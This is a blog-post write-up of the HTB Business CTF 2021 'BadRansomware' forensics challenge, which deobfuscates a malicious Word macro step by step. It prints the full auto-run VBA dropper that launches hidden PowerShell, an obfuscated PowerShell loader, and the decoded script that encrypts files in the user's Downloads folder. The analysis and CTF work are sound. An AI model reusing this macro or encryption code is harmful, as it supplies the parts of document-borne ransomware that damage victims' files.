---
layout: post
title:  "HTB Business CTF 2021 - BadRansomware writeup"
date:   2021-07-28 20:00:00 +0300
categories: HTB_Business_CTF_2021 CTF
summary: Writeup for the BadRansomware challenge from HTB's Business CTF from 2021. This challenge showcased some techniques used by real malware.
---

[Bad Ransomware](https://ctftime.org/task/16673) was a challenge at the HTB Business CTF 2021 from the 'Forensics' category.  
For this challenge we had to download a Microsoft Word document (badRansomware.docm).  

As I was thinking in "CTF-mode", I haven't even tried opening it using Microsoft Word.    
Instead, I extracted the contents of that file using 7zip.  
The main thing that I noticed in there was that the document contained a VBA script.  
![Contents extracted from the word doc]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/badransomware_extracted.png){: .center-image}

Also, by taking a quick look at the images we can get an idea of how the malware operates without even opening the file.
![Image from doc]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/badransomware_image.png){: .center-image}
The victim is probably tricked into enabling editing so that the VBA code can run on their system.  

Anyway, back to the VBA code: the content of thae vbaProject.bin was not readable.  
So, I used an online service ([this one](https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php) to extract the VBA code in a readable form.  

![Image from doc]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/badransomware_online_extractor.png){: .center-image}
The output from that tool can be read below. It's very long and obfuscated.  
So, our next step should be to deobfuscate it and understand what it does. I will put that process step-by-step below. Feel free to jump at the end if it gets too boring. 

<details>
  <summary>VBA code - obfuscated(click to expand)</summary>
<p>
{% highlight python %}
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

Attribute VB_Name = "Module1"
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

Sub AutoOpen()
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Dim lqijdaihdm, ozmuxxvcfj
Sleep 0
Sleep 0
Sleep 0
Sleep 0
lqijdaihdm = 219
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
ozmuxxvcfj = 11 / Tan(lqijdaihdm)
Dim nxvrbjohlp
Sleep 0
Sleep 0
Sleep 0
Dim bhofyfqsep, qfqgcgzjyw
Sleep 0
bhofyfqsep = 213
Sleep 0
Sleep 0
Sleep 0
qfqgcgzjyw = 2 / Tan(bhofyfqsep)
nxvrbjohlp = ActiveDocument.Shapes("pelxcitrdd").AlternativeText
Dim flodmtaypj, jvlnaehckw
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
flodmtaypj = 216
Sleep 0
Sleep 0
Sleep 0
jvlnaehckw = 16 / Tan(flodmtaypj)
nxvrbjohlp = ActiveDocument.Shapes("adaopiwer").AlternativeText & nxvrbjohlp
Dim cfojvvygsc, kusmewpqle
Sleep 0
Sleep 0
Sleep 0
cfojvvygsc = 142
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
kusmewpqle = 7 / Tan(cfojvvygsc)
Dim hxeayqcjkw
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Dim mpjdkfcpwy, pwskaanarc
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
mpjdkfcpwy = 176
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
pwskaanarc = 3 / Tan(mpjdkfcpwy)
hxeayqcjkw = "@@@"
Dim sakzfltqsd, tmjquuqxcn
Sleep 0
Sleep 0
sakzfltqsd = 114
Sleep 0
Sleep 0
Sleep 0
tmjquuqxcn = 13 / Tan(sakzfltqsd)
nxvrbjohlp = Split(nxvrbjohlp, hxeayqcjkw)
Dim xdbhkftuxy, xfmydgoyhg
Sleep 0
Sleep 0
xdbhkftuxy = 244
Sleep 0
xfmydgoyhg = 7 / Tan(xdbhkftuxy)
Dim gvkbqsplby
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Dim fvhgsaanbr, mlxrgwziup
Sleep 0
fvhgsaanbr = 164
Sleep 0
mlxrgwziup = 20 / Tan(fvhgsaanbr)
gvkbqsplby = 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Dim rwruwadwii, zlhnhmondv
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
rwruwadwii = 261
Sleep 0
zlhnhmondv = 9 / Tan(rwruwadwii)
Dim qtlapbphgi
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Dim yjxjcijsmy, cnvhrfgahf
Sleep 0
Sleep 0
Sleep 0
Sleep 0
yjxjcijsmy = 142
Sleep 0
Sleep 0
Sleep 0
Sleep 0
cnvhrfgahf = 6 / Tan(yjxjcijsmy)
qtlapbphgi = UBound(nxvrbjohlp) - 1
Dim vcagzoujxg, tmxbnkwhov
Sleep 0
vcagzoujxg = 299
Sleep 0
tmxbnkwhov = 20 / Tan(vcagzoujxg)
Dim zxzflmeecx
For E = gvkbqsplby To qtlapbphgi
Dim qyexnwafyb, hhxzrzkunq
Sleep 0
Sleep 0
Sleep 0
qyexnwafyb = 209
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
hhxzrzkunq = 12 / Tan(qyexnwafyb)
Dim otfyqjyayp
Sleep 0
Sleep 0
Dim uagvycagqv, sqqsddtdeo
Sleep 0
Sleep 0
Sleep 0
Sleep 0
uagvycagqv = 193
Sleep 0
Sleep 0
Sleep 0
sqqsddtdeo = 6 / Tan(uagvycagqv)
Dim jqdtyohplz
Sleep 0
Sleep 0
Sleep 0
Dim kfjpmnjmnk, trgorcjrzg
Sleep 0
kfjpmnjmnk = 121
Sleep 0
trgorcjrzg = 8 / Tan(kfjpmnjmnk)
otfyqjyayp = nxvrbjohlp(E)
Dim izzwsqycpd, sgptfleqdc
Sleep 0
Sleep 0
izzwsqycpd = 144
Sleep 0
Sleep 0
Sleep 0
sgptfleqdc = 14 / Tan(izzwsqycpd)
jqdtyohplz = ChrW(otfyqjyayp)
Dim iehqtgzbix, dimapxqodt
Sleep 0
iehqtgzbix = 281
Sleep 0
dimapxqodt = 11 / Tan(iehqtgzbix)
zxzflmeecx = zxzflmeecx & jqdtyohplz
Dim zgtmroijyp, qgohafconv
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
zgtmroijyp = 127
Sleep 0
Sleep 0
qgohafconv = 19 / Tan(zgtmroijyp)
Next
Dim uhykmvhjep, sbplkxtzdh
Sleep 0
Sleep 0
Sleep 0
Sleep 0
uhykmvhjep = 164
Sleep 0
Sleep 0
sbplkxtzdh = 20 / Tan(uhykmvhjep)
zxzflmeecx = "ell -e IAB" & zxzflmeecx
Dim nmcjkawjha, ssykbvliaz
Sleep 0
Sleep 0
Sleep 0
nmcjkawjha = 124
Sleep 0
Sleep 0
Sleep 0
ssykbvliaz = 16 / Tan(nmcjkawjha)
zxzflmeecx = "wersh" & zxzflmeecx
Dim bxjbolkxwx, zkvbaocdar
Sleep 0
Sleep 0
Sleep 0
Sleep 0
bxjbolkxwx = 140
Sleep 0
Sleep 0
zkvbaocdar = 7 / Tan(bxjbolkxwx)
zxzflmeecx = "po" & zxzflmeecx
Dim hywymasgnh, axfgmhjfgt
Sleep 0
hywymasgnh = 168
Sleep 0
Sleep 0
Sleep 0
axfgmhjfgt = 13 / Tan(hywymasgnh)
Call Shell(zxzflmeecx, 0)
Sleep 0
Dim zrekfillik, gxwbfbnogb
Sleep 0
Sleep 0
Sleep 0
Sleep 0
zrekfillik = 181
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Sleep 0
gxwbfbnogb = 14 / Tan(zrekfillik)
Sleep 0
Sleep 0
Sleep 0
Sleep 0
Dim rflodrfqdx, rtkvsswpoh
Sleep 0
Sleep 0
Sleep 0
Sleep 0
rflodrfqdx = 123
Sleep 0
Sleep 0
rtkvsswpoh = 15 / Tan(rflodrfqdx)
End Sub
{% endhighlight %}
</p>
</details>

At a quick glance, we can a very high number of 'Sleep 0' lines. These should be the first thing that we remove.  
The result can be seen below.  

<details>
  <summary>VBA code - deobfuscation - step 1(click to expand)</summary>
<p>
{% highlight python %}
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

Attribute VB_Name = "Module1"

Sub AutoOpen()
Dim lqijdaihdm, ozmuxxvcfj
lqijdaihdm = 219
ozmuxxvcfj = 11 / Tan(lqijdaihdm)
Dim nxvrbjohlp
Dim bhofyfqsep, qfqgcgzjyw
bhofyfqsep = 213
qfqgcgzjyw = 2 / Tan(bhofyfqsep)
nxvrbjohlp = ActiveDocument.Shapes("pelxcitrdd").AlternativeText
Dim flodmtaypj, jvlnaehckw
flodmtaypj = 216
jvlnaehckw = 16 / Tan(flodmtaypj)
nxvrbjohlp = ActiveDocument.Shapes("adaopiwer").AlternativeText & nxvrbjohlp
Dim cfojvvygsc, kusmewpqle
cfojvvygsc = 142
kusmewpqle = 7 / Tan(cfojvvygsc)
Dim hxeayqcjkw
Dim mpjdkfcpwy, pwskaanarc
mpjdkfcpwy = 176
pwskaanarc = 3 / Tan(mpjdkfcpwy)
hxeayqcjkw = "@@@"
Dim sakzfltqsd, tmjquuqxcn
sakzfltqsd = 114
tmjquuqxcn = 13 / Tan(sakzfltqsd)
nxvrbjohlp = Split(nxvrbjohlp, hxeayqcjkw)
Dim xdbhkftuxy, xfmydgoyhg
xdbhkftuxy = 244
xfmydgoyhg = 7 / Tan(xdbhkftuxy)
Dim gvkbqsplby
Dim fvhgsaanbr, mlxrgwziup
fvhgsaanbr = 164
mlxrgwziup = 20 / Tan(fvhgsaanbr)
gvkbqsplby = 0
Dim rwruwadwii, zlhnhmondv
rwruwadwii = 261
zlhnhmondv = 9 / Tan(rwruwadwii)
Dim qtlapbphgi
Dim yjxjcijsmy, cnvhrfgahf
yjxjcijsmy = 142
cnvhrfgahf = 6 / Tan(yjxjcijsmy)
qtlapbphgi = UBound(nxvrbjohlp) - 1
Dim vcagzoujxg, tmxbnkwhov
vcagzoujxg = 299
tmxbnkwhov = 20 / Tan(vcagzoujxg)
Dim zxzflmeecx
For E = gvkbqsplby To qtlapbphgi
Dim qyexnwafyb, hhxzrzkunq
qyexnwafyb = 209
hhxzrzkunq = 12 / Tan(qyexnwafyb)
Dim otfyqjyayp
Dim uagvycagqv, sqqsddtdeo
uagvycagqv = 193
sqqsddtdeo = 6 / Tan(uagvycagqv)
Dim jqdtyohplz
Dim kfjpmnjmnk, trgorcjrzg
kfjpmnjmnk = 121
trgorcjrzg = 8 / Tan(kfjpmnjmnk)
otfyqjyayp = nxvrbjohlp(E)
Dim izzwsqycpd, sgptfleqdc
izzwsqycpd = 144
sgptfleqdc = 14 / Tan(izzwsqycpd)
jqdtyohplz = ChrW(otfyqjyayp)
Dim iehqtgzbix, dimapxqodt
iehqtgzbix = 281
dimapxqodt = 11 / Tan(iehqtgzbix)
zxzflmeecx = zxzflmeecx & jqdtyohplz
Dim zgtmroijyp, qgohafconv
zgtmroijyp = 127
qgohafconv = 19 / Tan(zgtmroijyp)
Next
Dim uhykmvhjep, sbplkxtzdh
uhykmvhjep = 164
sbplkxtzdh = 20 / Tan(uhykmvhjep)
zxzflmeecx = "ell -e IAB" & zxzflmeecx
Dim nmcjkawjha, ssykbvliaz
nmcjkawjha = 124
ssykbvliaz = 16 / Tan(nmcjkawjha)
zxzflmeecx = "wersh" & zxzflmeecx
Dim bxjbolkxwx, zkvbaocdar
bxjbolkxwx = 140
zkvbaocdar = 7 / Tan(bxjbolkxwx)
zxzflmeecx = "po" & zxzflmeecx
Dim hywymasgnh, axfgmhjfgt
hywymasgnh = 168
axfgmhjfgt = 13 / Tan(hywymasgnh)
Call Shell(zxzflmeecx, 0)
Dim zrekfillik, gxwbfbnogb
zrekfillik = 181
gxwbfbnogb = 14 / Tan(zrekfillik)
Dim rflodrfqdx, rtkvsswpoh
rflodrfqdx = 123
rtkvsswpoh = 15 / Tan(rflodrfqdx)
End Sub
{% endhighlight %}
</p>
</details>

This is still far from being readable so we start looking at the code.  
We notice that there is a pattern in there; 3 consecutive lines where:
- in the first line two variables are declared
- in the second line a value is assigned to the first one
- in the third line a value is assigned to the second one. Usually involving division, the Tan function and the first variable

These are never used anywhere else in the code. They're used just as padding to hide the actual code.  
So, our next step is removing these lines and seeing what we get.

<details>
  <summary>VBA code - deobfuscation - step 3(click to expand)</summary>
<p>
{% highlight python %}
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

Attribute VB_Name = "Module1"

Sub AutoOpen()
Dim nxvrbjohlp
nxvrbjohlp = ActiveDocument.Shapes("pelxcitrdd").AlternativeText
nxvrbjohlp = ActiveDocument.Shapes("adaopiwer").AlternativeText & nxvrbjohlp
Dim hxeayqcjkw
hxeayqcjkw = "@@@"
nxvrbjohlp = Split(nxvrbjohlp, hxeayqcjkw)
Dim gvkbqsplby
gvkbqsplby = 0
Dim qtlapbphgi
qtlapbphgi = UBound(nxvrbjohlp) - 1
Dim zxzflmeecx
For E = gvkbqsplby To qtlapbphgi
Dim otfyqjyayp
Dim jqdtyohplz
otfyqjyayp = nxvrbjohlp(E)
jqdtyohplz = ChrW(otfyqjyayp)
zxzflmeecx = zxzflmeecx & jqdtyohplz
Next
zxzflmeecx = "ell -e IAB" & zxzflmeecx
zxzflmeecx = "wersh" & zxzflmeecx
zxzflmeecx = "po" & zxzflmeecx
Call Shell(zxzflmeecx, 0)
End Sub
{% endhighlight %}

</p>
</details>

Note: I have not tried to automate removing these lines. I guess you could remove 2 lines above anything that contains "Tan(" if you want to try automating it  
  
At this point we can read the code and try to understand what it does.  
Whiel doing this, I started naming the variables, indenting the code and making some other minor changes.

<details>
  <summary>VBA code - deobfuscation - readable code(click to expand)</summary>
<p>
{% highlight python %}
Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True

Attribute VB_Name = "Module1"

Sub AutoOpen()
Dim text
text = ActiveDocument.Shapes("pelxcitrdd").AlternativeText
text = ActiveDocument.Shapes("adaopiwer").AlternativeText & text

padding = "@@@"
text = Split(text, padding)
Dim start
start = 0
Dim end
end = UBound(text) - 1

Dim command
For E = start To end
	Dim current_char
	Dim decoded_char
	current_char = text(E)

	decoded_char = ChrW(current_char)
	command = command & decoded_char
Next

command = "powershell -e IAB" & command
Call Shell(command, 0)

End Sub
{% endhighlight %}

</p>
</details>

Much better.  
Now we can see what this does:
- first, it looks for two shape objects in the document (they're the two images) and reads their description  
That description can be looked up manually. They're long and it does not contain anything human-readable.
- Then it puts the two descriptions together and splits their content using '@@@' as a separator  
That piece of text contains numbers separated by groups of 3 @ symbols.  
So, the result of this step is an array of numbers
- Then each number from the array obtained above is turned into its corresponding character. It's all ASCII from what I've noticed. So no weird characters
- These characters are joined together and then added to a "powershell -e IAB<text_goes_here>" command that gets ran on the system

It should be noted that the 'IAB' part from the powershell command is part of the "payload" that will get executed. So that part should not be left out.  
To replicate this behavior I created a python script that parsed the document.xml for these two shapes and then did what I described above

{% highlight python %}
import xml.etree.ElementTree as et

target_file = open('document.xml')
vba = target_file.read()
target_file.close()

root = et.fromstring(vba)
named_elements = root.findall(".//*[@name]")

# We only get 4 elements, so I'll just extract these ones
elements_p = [n for n in named_elements if n.attrib['name'] == 'pelxcitrdd']
payload1 = elements_p[0].attrib['descr']

elements_a = [n for n in named_elements if n.attrib['name'] == 'adaopiwer']
payload2 = elements_a[0].attrib['descr']

payload = payload2 + payload1
payload = payload.split('@@@')

decoded = ['I', 'A', 'B']

for encoded_char in payload:
	decoded.append(chr(int(encoded_char)))

print(''.join(decoded))
{% endhighlight %}

After running it I got a string that looked like base64. So I used CyberChef to decode it.  
It looks like powershell. However, it had more layers of obfuscation starting with lots of dots that I had to remove.  

The result looked something like this 

{% highlight powershell %}
 IEX( -joiN('36w97%32p61}32X34I36c72c79%77}69w92%92I100M111U119X110U108w111U97M100X115}34w13}10p13}10X91X82c101}102w108w101R99I116I105U111M110M46M65R115w115w101U109M98I108U121U93}58w58p40p39w76%111U39%43U39I97}100%70U105c39w43w39c108I101M39}41c46c73I110c118p111}107U101w40M40}40U40U34w123w48X125U123w49p53c125U123R49X50%125U123U49w48%125w123I51w125X123I49M52}125c123c49U54U125}123M57w125p123U52p125p123I50U125M123%49}49M125}123%49X51%125w123c54}125c123M53}125M123w56I125R123w49U55p125c123c49I125M123c55U125M34X45w102U32p39R67R58I107%98w51w87p73X39%44}39p98I39p44%39%119R111c114w39%44%39R102}116M39w44w39p98M51M70p114}97}109X101U39w44}39M83R121I115%116c101%39I44%39c98U51X39c44I39I46p100c108p108U39R44I39M109R39w44c39R84X107w39U44c39I98U51w77w105c99I114U111I115}111}39p44c39M107X107}39p44c39M83U107}39I44w39I98w51U118%50p46}48M46M53%48X55U50U55%107U39U44X39p46R39%44p39}78U68w79U87}39}44I39p78p69p39w44X39M46}87R101X39w41w41U46c34X82}69U112I96%76X97p99I101%34X40U40I91I67R72R97I82R93p49p48c55}43R91X67X72R97w82w93%57p56R43}91M67w72w97R82p93I53p49%41%44M91}115I116%114U105X78w103p93w91%67I72R97I82M93c57U50X41I41I41I32X124X32w38R40c34R123X48}125}123%49c125X34p32}45c102p32U39I111c117X116p45%39M44w39c110%117U108X108I39M41}13c10M13M10w13w10}46M40%34U123X50R125R123c49U125}123}48X125%34U32R45R102w39U45U67M104%105I108p100I73M116R101R109w39I44c39%101M116I39c44%39}71}39I41M32%45%80R97U116M104p32I36I97%32p124c32%38}40}34w123U50c125X123%48X125w123M49U125c34}45R102}39}99U104I45U79U98M39p44}39I106U101c99p116%39X44}39}70M111U114w101c97w39}41X32p123I13X10M9%36%101c114p116R32w61p32p36U95%46p34X70w85c96I76%76w110c65X77I69%34R32M43U32w40w34w123}48}125M123X49w125R123w50X125}34p45R102c32p39M46%101R39I44}39p110R39%44w39M99}101U100p39I41R13U10%9U36c115%116c117I102w102X32p61U32U38X40U34%123M49I125c123I50R125X123%48I125X34}45U102w39U116R39R44U39M71X101%116M45X67X111M110I39U44U39}116M101w110R39%41R32U36%95p46I34M102c117}96w76I108R110M97c77U101M34X13I10}9}13M10p9p36U100w114M116%32}61w32I91}83c121%115U116p101}109M46p67w111p110U118M101M114X116M93I58X58X40}39}70}39X43w39X114w111c109%66c97X115%101M39c43I39}54X39%43U39}52w83w116%114}105I110M39I43w39c103M39M41X46I73c110U118p111I107}101X40U40%34%123%48I125%123I51%125R123%50}125U123R49R125X123R53I125p123p52I125R34U45X102X32w39R83U70M39R44}39p48c98}110w77U119M98p84X78}51%97%68R78p83X39p44w39p73w39I44M39M82}67M101U51w39I44w39w81c61M61}39%44}39%102U39}41w41M13w10}9%36w114R32R61M32p38R40}34X123M50X125R123M49c125p123X48I125I123c51w125I34w32U45X102%32w39w98w39U44U39U79I39X44X39%110p101M119}45c39R44%39R106X101p99U116c39p41I32U40p34p123p49p48%125R123R53R125c123c49U125U123U48R125M123c57X125X123p51R125I123}54M125M123c55R125}123R50U125}123c52p125X123w56}125}34w45M102U39p101c99%117X114X105p116w39w44w39U46U83}39U44I39}100c97R101M39}44c39I103w114U39R44I39p108M77I97I110c39I44R39U121%115%116I101w109X39M44%39M97p112}104}121}46M82w105R106R39w44%39X110%39R44U39c97U103}101w100R39M44c39}121R46%67w114c121U112}116I111}39U44R39%83U39w41X32R13U10w9c36I99p32}61I32X36c114I46I40w39}67p114p101R39I43c39X97}116w101c69p110I39I43R39U99}114M121%39%43w39I112U116c111p39%43M39M114X39c41%46p73U110}118}111I107X101U40R36X100%114R116R44%32U40c49p46R46c49M54U41p41c13M10R9U36w109I115M32}61R32X38U40M34c123p50p125R123%49I125%123%48%125U34I45X102M32M39p99U116p39X44c39w98I106c101}39w44%39c110I101U119w45I79c39U41R32R40X34R123M51w125p123R49}125%123%48c125I123c50w125}34c45U102c32R39R116R39c44U39p79I46R77%101U109I111w114%121M83I39U44M39U114I101p97}109p39U44M39M73R39w41I13c10p9p36I99}115U32p61p32}38M40U34X123R48X125X123}49I125}123}50X125c34X32R45c102c39U110}39%44w39X101U119R45M39}44I39c79M98U106X101M99p116%39}41X32R40I34c123}50c125M123p52c125U123p53U125I123I48}125U123}55X125R123U49c125w123U57M125M123X51I125p123%56I125p123I54X125}34}32}45I102c39}67M114I121w39}44p39M103I39w44w39w83X39%44c39I67w114I121w112X116M39X44w39X101M99w117I114}105I39c44I39R116%121%46p39w44X39U97%109%39}44p39%112}116%111w39w44I39}111w83I116%114R101R39X44M39%114M97p112X104X121I46U39M41%32I36R109M115w44U36c99X44c40c34R123X48c125U123M49M125M34p45X102c39p87I39X44c39p114w105X116w101I39U41}13U10X9U36M115M119w32X61%32I38%40}34%123U49I125M123}50X125M123c48p125R34w45M102X32}39M116M39c44R39w110I101R119%39w44w39X45U79}98R106U101p99%39U41X32p40R34w123w48%125c123c50I125c123R52I125p123I49p125X123I51c125}34I32p45p102c32c39I73I79p39I44}39c97p109R39U44X39I46}83p116%114M39p44M39I87R114w105U116p101I114I39p44p39w101M39}41%32X36}99w115w13c10c9w36c115R119c46R40R39}87w114c105%116U39c43c39c101}39c41}46U73w110R118U111}107w101p40M36p115%116w117X102X102I41U13p10w9w36M115}119X46M40R39I67p39I43U39%108X111X115U101I39}41%46M73I110}118p111M107c101w40X41}13%10X9X36%99}115X46R40%39w67X39}43U39X108c111R115X101M39p41%46}73M110p118R111%107c101%40U41}13c10I9}36U109U115R46p40c39U67X108%111R115I39M43w39M101}39w41R46%73U110c118X111p107%101U40p41w13M10I9R36p114M46I40U39w67X108}101M97w39U43%39X114%39}41%46%73I110}118I111R107U101w40X41I13p10w9I91I98w121I116c101U91U93%93p36M117w116}115M32p61I32I36%109I115X46I40X39R84X111}65}114}39w43M39w114M97}121R39R41w46X73p110%118}111M107p101p40p41c13w10X9I91w105c111}46M102p105M108M101}93M58p58I40%39%87I39R43U39M114M105R116}101%39U43p39w65}108X39%43p39%108}39}43}39p66p121R116p101U115I39R41w46I73X110%118c111I107R101M40w36R101X114p116w44I36X117%116}115R41U13R10c125'.splIt('XwcIMp}UR%')| %{ ([cHar] [INT] $_)} ))
{% endhighlight %}

Note: I added the dot before 'split' to obtain '.split' as that was the only one that should've remained. All the other dots were removed  

An easy way to deobfuscate this was to run the powershell command that decoded the file but omitting the part that would execute the output.  
Also, I did this in an isolated environment. You can never be too safe (even if this is probably not real malware).  
The result can be seen below

{% highlight powershell %}
a = "$HOME\\downloads"
#"LoadFile" "Path #"C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727\System.Web.dll

[Reflection.Assembly]::('Lo'+'adFi'+'le').Invoke(((("{0}{15}{12}{10}{3}{14}{16}{9}{4}{2}{11}{13}{6}{5}{8}{17}{1}{7}"-f 'C:kb3WI','b','wor','ft','b3Frame','Syste','b3','.dll','m','Tk','b3Microso','kk','Sk','b3v2.0.50727k','.','NDOW','NE','.We'))."REp`Lace"(([CHaR]107+[CHaR]98+[CHaR]51),[striNg][CHaR]92))) | &("{0}{1}" -f 'out-','null')



#cmdlet ForEach-Object at command pipeline position 2
#Supply values for the following parameters:
.("{2}{1}{0}" -f'-ChildItem','et','G') -Path $a | &("{2}{0}{1}"-f'ch-Ob','ject','Forea') 


# - $_.current item in the pipeline - $ert variable stores .enced file extension - for the encrypted file

{		#  here the encryption process starts
		# - $_.current item in the pipeline - $ert variable stores .enced file extension - for the encrypted file
        $ert = $_."FU`LLnAME" + ("{0}{1}{2}"-f '.e','n','ced')
		# get content full name
        $stuff = &("{1}{2}{0}"-f't','Get-Con','ten') $_."fu`LlnaMe"


<# drt = 		72
				84
				66
				123
				114
				52
				110
				115
				48
				109
				51
				119
				104
				51
				82
				125
 #>
        $drt = [System.Convert]::('F'+'romBase'+'6'+'4Strin'+'g').Invoke(("{0}{3}{2}{1}{5}{4}"-f 'SF','0bnMwbTN3aDNS','I','RCe3','Q==','f'))
		
		#r = 
		<# BlockSize       : 128
		FeedbackSize    : 128
		IV              : {141, 245, 106, 78…}
		Key             : {151, 231, 53, 62…}
		KeySize         : 256
		Mode            : CBC
		Padding         : PKCS7
		LegalKeySizes   : {System.Security.Cryptography.KeySizes}
		LegalBlockSizes : {System.Security.Cryptography.KeySizes} #>

        $r = &("{2}{1}{0}{3}" -f 'b','O','new-','ject') ("{10}{5}{1}{0}{9}{3}{6}{7}{2}{4}{8}"-f'ecurit','.S','dae','gr','lMan','ystem','aphy.Rij','n','aged','y.Crypto','S')
		
		#c=
<# 		CanReuseTransform CanTransformMultipleBlocks InputBlockSize OutputBlockSize
----------------- -------------------------- -------------- ---------------
             True                       True             16              16 #>

		
        $c = $r.('Cre'+'ateEn'+'cry'+'pto'+'r').Invoke($drt, (1..16))
		#ms = 
<# 		CanRead      : True
		CanSeek      : True
		CanWrite     : True
		Capacity     : 0
		Length       : 0
		Position     : 0
		CanTimeout   : False
		ReadTimeout  : 
		WriteTimeout :  #>

        $ms = &("{2}{1}{0}"-f 'ct','bje','new-O') ("{3}{1}{0}{2}"-f 't','O.MemoryS','ream','I')
		
		#cs= 
		<# CanRead              : False
		CanSeek              : False
		CanWrite             : True
		Length               : 
		Position             : 
		HasFlushedFinalBlock : False
		CanTimeout           : False
		ReadTimeout          : 
		WriteTimeout         :  #>


		
		
        $cs = &("{0}{1}{2}" -f'n','ew-','Object') ("{2}{4}{5}{0}{7}{1}{9}{3}{8}{6}" -f'Cry','g','S','Crypt','ecuri','ty.','am','pto','oStre','raphy.') $ms,$c,("{0}{1}"-f'W','rite')
		
        $sw = &("{1}{2}{0}"-f 't','new','-Objec') ("{0}{2}{4}{1}{3}" -f 'IO','am','.Str','Writer','e') $cs
		
<# 		AutoFlush      : False
		BaseStream     : System.Security.Cryptography.CryptoStream
		Encoding       : System.Text.UTF8Encoding
		FormatProvider : en-US
		NewLine        :  #>

		#Write stuff to the file -> Encryption
        $sw.('Writ'+'e').Invoke($stuff)
        $sw.('C'+'lose').Invoke()
        $cs.('C'+'lose').Invoke()
        $ms.('Clos'+'e').Invoke()
        $r.('Clea'+'r').Invoke()
        [byte[]]$uts = $ms.('ToAr'+'ray').Invoke()
        [io.file]::('W'+'rite'+'Al'+'l'+'Bytes').Invoke($ert,$uts)
{% endhighlight %}

This actually calls the Windows Crypto API and encrypts files from your downloads folder. I guess "this is probably not real malware" is not really true in this case.  
The good news is that it does not delete the originals so it's not really doing any harm.  

The thing that looks interesting at the first glance is this part

{% highlight powershell %}
<# drt = 		72
				84
				66
				123
				114
				52
				110
				115
				48
				109
				51
				119
				104
				51
				82
				125
{% endhighlight %}

I took these numbers and turned them into characters and that's how I got the flag for this challenge.  
To do that, I used CyberChef again.

![Flag]({{site.baseurl}}/assets/img/HTB_Business_CTF_2021/badransomware_flag.png){: .center-image}
